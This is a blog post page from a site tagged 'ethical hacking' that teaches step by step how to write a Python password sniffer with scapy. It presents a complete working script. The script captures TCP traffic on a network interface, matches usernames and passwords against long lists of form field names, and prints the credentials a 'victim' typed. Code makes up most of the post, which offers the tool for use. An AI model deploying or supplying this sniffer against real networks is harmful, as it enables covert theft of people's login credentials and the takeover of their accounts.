<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.6.2"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Writing a password sniffer using python" /><meta name="author" content="Mohamed Ezzat" /><meta property="og:locale" content="en_US" /><meta name="description" content="What is password sniffer ? A password sniffer is a software application that scans and records passwords that are used or broadcasted on a computer or network interface. It listens to all incoming and outgoing network traffic and records any instance of a data packet that contains a password." /><meta property="og:description" content="What is password sniffer ? A password sniffer is a software application that scans and records passwords that are used or broadcasted on a computer or network interface. It listens to all incoming and outgoing network traffic and records any instance of a data packet that contains a password." /><link rel="canonical" href="https://mohamedaezzat.github.io/posts/passwordsniffer/" /><meta property="og:url" content="https://mohamedaezzat.github.io/posts/passwordsniffer/" /><meta property="og:site_name" content="Echo" /><meta property="og:image" content="https://mohamedaezzat.github.io/assets/img/posts/passwordsniffer/passwordsniffer.jpg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-19T08:58:58+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://mohamedaezzat.github.io/assets/img/posts/passwordsniffer/passwordsniffer.jpg" /><meta property="twitter:title" content="Writing a password sniffer using python" /><meta name="google-site-verification" content="SgWV4a8DvyptkO8yPJwWMZ7DexcYzADmzpG_jTBbaVY" /> <script type="application/ld+json"> {"image":"https://mohamedaezzat.github.io/assets/img/posts/passwordsniffer/passwordsniffer.jpg","description":"What is password sniffer ? A password sniffer is a software application that scans and records passwords that are used or broadcasted on a computer or network interface. It listens to all incoming and outgoing network traffic and records any instance of a data packet that contains a password.","url":"https://mohamedaezzat.github.io/posts/passwordsniffer/","headline":"Writing a password sniffer using python","dateModified":"2020-12-19T08:58:58+02:00","@type":"BlogPosting","datePublished":"2020-12-19T08:58:58+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mohamedaezzat.github.io/posts/passwordsniffer/"},"author":{"@type":"Person","name":"Mohamed Ezzat"},"@context":"https://schema.org"}</script><title>Writing a password sniffer using python | Echo</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Echo</a></div><div class="site-subtitle font-italic">Hacking Stuff</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/MohamedAEzzat" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mohamedahmedpk','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Writing a password sniffer using python</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Writing a password sniffer using python</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 19, 2020, 8:58 AM +0200" > Dec 19, 2020 <i class="unloaded">2020-12-19T08:58:58+02:00</i> </span> by <span class="author"> Mohamed Ezzat </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/passwordsniffer/passwordsniffer.jpg" class="preview-img"><h2 id="what-is-password-sniffer-">What is password sniffer ?</h2><p>A password sniffer is a software application that scans and records passwords that are used or broadcasted on a computer or network interface. It listens to all incoming and outgoing network traffic and records any instance of a data packet that contains a password.</p><h2 id="writing-the-script">Writing the script</h2><h3 id="step-1-importing-required-modules">Step 1: Importing required modules</h3><ul><li>scapy: Scapy is a powerful Python-based interactive packet manipulation program and library. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, store or read them using pcap files, match requests and replies, and much more.<li>urllib (parse): Urllib module is the URL handling module for python. It is used to fetch URLs (Uniform Resource Locators). It uses the urlopen function and is able to fetch URLs using a variety of different protocols. Urllib is a package that collects several modules for working with URLs, such as parse for parsing URLs.<li>re: A regular expression (or RE) specifies a set of strings that matches it; the functions in this module let you check if a particular string matches a given regular expression (or if a given regular expression matches a particular string, which comes down to the same thing).</ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c1"># Python code snippet
</span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.layers.inet</span> <span class="kn">import</span> <span class="n">TCP</span><span class="p">,</span> <span class="n">IP</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
<span class="kn">import</span> <span class="nn">re</span>
</pre></table></code></div></div><h2 id="step-2-implementing-required-functions">Step 2: Implementing required functions</h2><h3 id="pkt_parser-function">pkt_parser() function</h3><p>This function filters the sniffed packets to get the packets that might contain the username and password. We search for tha packets that has TCP, Raw, and IP layer. If that packet is what we are looking for, then we store the body (or payload) of that packet and pass it as a parameter to get_login_pass() function that we will implement later. user_pass variable contains the returned value (user and passwd ) of get_login_pass() function; therefore, we check if that variable is not equal to none, then we print the payload itself to know which website the victim use and we print the username and password that the victim entered. If the sniffed packet is not that one we are looking for, then we just pass and let that packet go since it probably does not contain any username or any password.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c1">#Python code snippet
</span><span class="k">def</span> <span class="nf">pkt_parser</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">):</span>
        <span class="n">body</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">user_pass</span> <span class="o">=</span> <span class="n">get_login_pass</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user_pass</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">user_pass</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">user_pass</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
    <span class="k">else</span><span class="p">:</span>
          <span class="k">pass</span>
</pre></table></code></div></div><h3 id="get_login_pass-function">get_login_pass() function</h3><p>In this function, we define user and passwd variables with a default value “None” and we define userfields and passfields with a list. Then, we iterate over each list and use regex to compare the data that we found at the payload to our defined regex pattern. If we found matches, then we store the found username and password. And at the end of the function, we return both value the username and password.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="c1">#Python code snippet
</span><span class="k">def</span> <span class="nf">get_login_pass</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>

    <span class="n">user</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="n">userfields</span> <span class="o">=</span> <span class="p">[</span><span class="s">'log'</span><span class="p">,</span> <span class="s">'login'</span><span class="p">,</span> <span class="s">'wpname'</span><span class="p">,</span> <span class="s">'ahd_username'</span><span class="p">,</span> <span class="s">'unickname'</span><span class="p">,</span> <span class="s">'nickname'</span><span class="p">,</span> <span class="s">'user'</span><span class="p">,</span> <span class="s">'user_name'</span><span class="p">,</span>
                  <span class="s">'alias'</span><span class="p">,</span> <span class="s">'pseudo'</span><span class="p">,</span> <span class="s">'email'</span><span class="p">,</span> <span class="s">'username'</span><span class="p">,</span> <span class="s">'_username'</span><span class="p">,</span> <span class="s">'userid'</span><span class="p">,</span> <span class="s">'form_loginname'</span><span class="p">,</span> <span class="s">'loginname'</span><span class="p">,</span>
                  <span class="s">'login_id'</span><span class="p">,</span> <span class="s">'loginid'</span><span class="p">,</span> <span class="s">'session_key'</span><span class="p">,</span> <span class="s">'sessionkey'</span><span class="p">,</span> <span class="s">'pop_login'</span><span class="p">,</span> <span class="s">'uid'</span><span class="p">,</span> <span class="s">'id'</span><span class="p">,</span> <span class="s">'user_id'</span><span class="p">,</span> <span class="s">'screename'</span><span class="p">,</span>
                  <span class="s">'uname'</span><span class="p">,</span> <span class="s">'ulogin'</span><span class="p">,</span> <span class="s">'acctname'</span><span class="p">,</span> <span class="s">'account'</span><span class="p">,</span> <span class="s">'member'</span><span class="p">,</span> <span class="s">'mailaddress'</span><span class="p">,</span> <span class="s">'membername'</span><span class="p">,</span> <span class="s">'login_username'</span><span class="p">,</span>
                  <span class="s">'login_email'</span><span class="p">,</span> <span class="s">'loginusername'</span><span class="p">,</span> <span class="s">'loginemail'</span><span class="p">,</span> <span class="s">'uin'</span><span class="p">,</span> <span class="s">'sign-in'</span><span class="p">,</span> <span class="s">'usuario'</span><span class="p">]</span>
    <span class="n">passfields</span> <span class="o">=</span> <span class="p">[</span><span class="s">'ahd_password'</span><span class="p">,</span> <span class="s">'pass'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">,</span> <span class="s">'_password'</span><span class="p">,</span> <span class="s">'passwd'</span><span class="p">,</span> <span class="s">'session_password'</span><span class="p">,</span> <span class="s">'sessionpassword'</span><span class="p">,</span>
                  <span class="s">'login_password'</span><span class="p">,</span> <span class="s">'loginpassword'</span><span class="p">,</span> <span class="s">'form_pw'</span><span class="p">,</span> <span class="s">'pw'</span><span class="p">,</span> <span class="s">'userpassword'</span><span class="p">,</span> <span class="s">'pwd'</span><span class="p">,</span> <span class="s">'upassword'</span><span class="p">,</span>
                  <span class="s">'login_password'</span>
                  <span class="s">'passwort'</span><span class="p">,</span> <span class="s">'passwrd'</span><span class="p">,</span> <span class="s">'wppassword'</span><span class="p">,</span> <span class="s">'upasswd'</span><span class="p">,</span> <span class="s">'senha'</span><span class="p">,</span> <span class="s">'contrasena'</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">login</span> <span class="ow">in</span> <span class="n">userfields</span><span class="p">:</span>
        <span class="n">login_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'(%s=[^&amp;</span><span class="se">\'</span><span class="s">]+)'</span> <span class="o">%</span> <span class="n">login</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">login_re</span><span class="p">:</span>
            <span class="n">user</span> <span class="o">=</span> <span class="n">login_re</span><span class="p">.</span><span class="n">group</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">passfield</span> <span class="ow">in</span> <span class="n">passfields</span><span class="p">:</span>
        <span class="n">pass_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'(%s=[^&amp;</span><span class="se">\'</span><span class="s">]+)'</span> <span class="o">%</span> <span class="n">passfield</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">pass_re</span><span class="p">:</span>
            <span class="n">passwd</span> <span class="o">=</span> <span class="n">pass_re</span><span class="p">.</span><span class="n">group</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">passwd</span><span class="p">:</span>
        <span class="k">return</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="step-4-the-script-start-point">Step 4: The script start point</h2><p>When we run the script, the code starts from here. We define an interface variable “iface” with value “eth0” which is the interface that we will use to sniff the packets on the network. Then, we use sniff function which is a predefined function in scapy module to start sniffing packets on the network. Also, we handle the KeyboardInterrupt exception, so we can terminate the program from keyboard safely.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1">#Python snippet code
</span><span class="n">iface</span> <span class="o">=</span> <span class="s">"eth0"</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">iface</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">pkt_parser</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exiting'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="the-complete-script">The complete script</h2><p>After assembling all the steps together, here is our script.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">scapy.layers.inet</span> <span class="kn">import</span> <span class="n">TCP</span><span class="p">,</span> <span class="n">IP</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">iface</span> <span class="o">=</span> <span class="s">"eth0"</span>

<span class="k">def</span> <span class="nf">get_login_pass</span><span class="p">(</span><span class="n">body</span><span class="p">):</span>

    <span class="n">user</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="n">userfields</span> <span class="o">=</span> <span class="p">[</span><span class="s">'log'</span><span class="p">,</span> <span class="s">'login'</span><span class="p">,</span> <span class="s">'wpname'</span><span class="p">,</span> <span class="s">'ahd_username'</span><span class="p">,</span> <span class="s">'unickname'</span><span class="p">,</span> <span class="s">'nickname'</span><span class="p">,</span> <span class="s">'user'</span><span class="p">,</span> <span class="s">'user_name'</span><span class="p">,</span>
                  <span class="s">'alias'</span><span class="p">,</span> <span class="s">'pseudo'</span><span class="p">,</span> <span class="s">'email'</span><span class="p">,</span> <span class="s">'username'</span><span class="p">,</span> <span class="s">'_username'</span><span class="p">,</span> <span class="s">'userid'</span><span class="p">,</span> <span class="s">'form_loginname'</span><span class="p">,</span> <span class="s">'loginname'</span><span class="p">,</span>
                  <span class="s">'login_id'</span><span class="p">,</span> <span class="s">'loginid'</span><span class="p">,</span> <span class="s">'session_key'</span><span class="p">,</span> <span class="s">'sessionkey'</span><span class="p">,</span> <span class="s">'pop_login'</span><span class="p">,</span> <span class="s">'uid'</span><span class="p">,</span> <span class="s">'id'</span><span class="p">,</span> <span class="s">'user_id'</span><span class="p">,</span> <span class="s">'screename'</span><span class="p">,</span>
                  <span class="s">'uname'</span><span class="p">,</span> <span class="s">'ulogin'</span><span class="p">,</span> <span class="s">'acctname'</span><span class="p">,</span> <span class="s">'account'</span><span class="p">,</span> <span class="s">'member'</span><span class="p">,</span> <span class="s">'mailaddress'</span><span class="p">,</span> <span class="s">'membername'</span><span class="p">,</span> <span class="s">'login_username'</span><span class="p">,</span>
                  <span class="s">'login_email'</span><span class="p">,</span> <span class="s">'loginusername'</span><span class="p">,</span> <span class="s">'loginemail'</span><span class="p">,</span> <span class="s">'uin'</span><span class="p">,</span> <span class="s">'sign-in'</span><span class="p">,</span> <span class="s">'usuario'</span><span class="p">]</span>
    <span class="n">passfields</span> <span class="o">=</span> <span class="p">[</span><span class="s">'ahd_password'</span><span class="p">,</span> <span class="s">'pass'</span><span class="p">,</span> <span class="s">'password'</span><span class="p">,</span> <span class="s">'_password'</span><span class="p">,</span> <span class="s">'passwd'</span><span class="p">,</span> <span class="s">'session_password'</span><span class="p">,</span> <span class="s">'sessionpassword'</span><span class="p">,</span>
                  <span class="s">'login_password'</span><span class="p">,</span> <span class="s">'loginpassword'</span><span class="p">,</span> <span class="s">'form_pw'</span><span class="p">,</span> <span class="s">'pw'</span><span class="p">,</span> <span class="s">'userpassword'</span><span class="p">,</span> <span class="s">'pwd'</span><span class="p">,</span> <span class="s">'upassword'</span><span class="p">,</span>
                  <span class="s">'login_password'</span>
                  <span class="s">'passwort'</span><span class="p">,</span> <span class="s">'passwrd'</span><span class="p">,</span> <span class="s">'wppassword'</span><span class="p">,</span> <span class="s">'upasswd'</span><span class="p">,</span> <span class="s">'senha'</span><span class="p">,</span> <span class="s">'contrasena'</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">login</span> <span class="ow">in</span> <span class="n">userfields</span><span class="p">:</span>
        <span class="n">login_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'(%s=[^&amp;</span><span class="se">\'</span><span class="s">]+)'</span> <span class="o">%</span> <span class="n">login</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">login_re</span><span class="p">:</span>
            <span class="n">user</span> <span class="o">=</span> <span class="n">login_re</span><span class="p">.</span><span class="n">group</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">passfield</span> <span class="ow">in</span> <span class="n">passfields</span><span class="p">:</span>
        <span class="n">pass_re</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'(%s=[^&amp;</span><span class="se">\'</span><span class="s">]+)'</span> <span class="o">%</span> <span class="n">passfield</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">pass_re</span><span class="p">:</span>
            <span class="n">passwd</span> <span class="o">=</span> <span class="n">pass_re</span><span class="p">.</span><span class="n">group</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">passwd</span><span class="p">:</span>
        <span class="k">return</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">pkt_parser</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">)</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">):</span>
        <span class="n">body</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span>
        <span class="n">user_pass</span> <span class="o">=</span> <span class="n">get_login_pass</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">user_pass</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">].</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">user_pass</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
            <span class="k">print</span><span class="p">(</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">user_pass</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
    <span class="k">else</span><span class="p">:</span>
          <span class="k">pass</span>



<span class="k">try</span><span class="p">:</span>
    <span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">iface</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">pkt_parser</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exiting'</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></table></code></div></div><h2 id="script-output">Script output</h2><p>And at the end, here is our script output as depicted below.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/passwordsniffer/script_output.png" alt="script_output" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/development/'>Development</a>, <a href='/categories/pentesting-tools/'>Pentesting Tools</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ethical-hacking/" class="post-tag no-text-decoration" >ethical hacking</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Writing a password sniffer using python - Echo&url=https://mohamedaezzat.github.io/posts/passwordsniffer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Writing a password sniffer using python - Echo&u=https://mohamedaezzat.github.io/posts/passwordsniffer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Writing a password sniffer using python - Echo&url=https://mohamedaezzat.github.io/posts/passwordsniffer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" 